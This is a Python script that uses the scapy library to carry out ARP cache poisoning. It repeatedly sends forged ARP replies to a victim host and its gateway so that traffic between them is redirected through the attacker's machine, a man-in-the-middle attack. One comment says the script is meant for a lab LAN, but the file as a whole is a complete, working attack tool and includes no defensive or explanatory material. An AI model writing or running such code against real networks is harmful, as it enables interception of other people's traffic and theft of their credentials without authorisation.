import time
import sys
from scapy.all import send, ARP

# --- Configuration: CHANGE THESE VALUES ---
# Use the actual IP and MAC addresses from your bridged LAN lab environment.
# Target A: The Victim
TARGET_IP = "192.168.1.20"
TARGET_MAC = "YY:YY:YY:Y2" # <<< Victim's actual MAC

# Target B: The Router/Gateway
GATEWAY_IP = "192.168.1.1"
GATEWAY_MAC = "XX:XX:XX:X1" # <<< Router's actual MAC

# --- Functions ---

def poison_target(target_ip, gateway_ip, target_mac):
    """
    Tells the target (victim) that the router is the attacker.
    """
    # op=2 (ARP Reply)
    # pdst=TARGET_IP (Packet Destination: The Victim's IP)
    # hwdst=TARGET_MAC (Hardware Destination: The Victim's real MAC)
    # psrc=GATEWAY_IP (Protocol Source: The IP we are SPOOFING)
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet, verbose=False)

def poison_gateway(target_ip, gateway_ip, gateway_mac):
    """
    Tells the router that the target (victim) is the attacker.
    """
    # op=2 (ARP Reply)
    # pdst=GATEWAY_IP (Packet Destination: The Router's IP)
    # hwdst=GATEWAY_MAC (Hardware Destination: The Router's real MAC)
    # psrc=TARGET_IP (Protocol Source: The IP we are SPOOFING)
    
    packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    send(packet, verbose=False)

def arp_poison():
    """Continuously sends poisoning packets."""
    print(f"[*] Starting ARP Poisoning on {TARGET_IP} and {GATEWAY_IP}...")
    
    try:
        while True:
            # Send the two necessary lies
            poison_target(TARGET_IP, GATEWAY_IP, TARGET_MAC)
            poison_gateway(TARGET_IP, GATEWAY_IP, GATEWAY_MAC)
            
            # Use sys.stdout.write for clean, in-line updates
            sys.stdout.write(f"\r[+] Sent poisons to Victim and Router. Sleeping 2s...")
            sys.stdout.flush()
            
            time.sleep(2) # Repeat every 2 seconds to keep caches poisoned
            
    except KeyboardInterrupt:
        print("\n[*] ARP Spoofing Stopped. Network will naturally restore shortly.")


if __name__ == "__main__":
    # Ensure correct values are set before running
    if '192.168' not in TARGET_IP:
         print("ERROR: Please set TARGET_IP and GATEWAY_IP in the script.")
         sys.exit(1)
         
    # Must be run with sudo
    arp_poison()
